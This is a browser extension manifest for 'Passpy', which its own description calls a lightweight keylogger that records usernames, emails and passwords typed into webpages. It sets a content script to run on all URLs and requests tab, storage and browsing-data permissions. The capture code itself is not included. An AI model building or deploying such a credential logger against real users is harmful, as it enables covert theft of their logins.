{
  "manifest_version": 2,
  "name": "Passpy",
  "short_name": "passpy",
  "description": "Light weight key logger that logs usernames, emails and passwords (login credentials) used in webpages into client database",
  "version": "0.0.0.2",
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["js/content.js"],
      "css" : [],
      "run_at" : "document_end"
    }
  ],
  "permissions": [
    "tabs",
    "storage",
    "browsingData"
  ],
  "background": {
    "scripts": ["js/background.js"]
  }
}
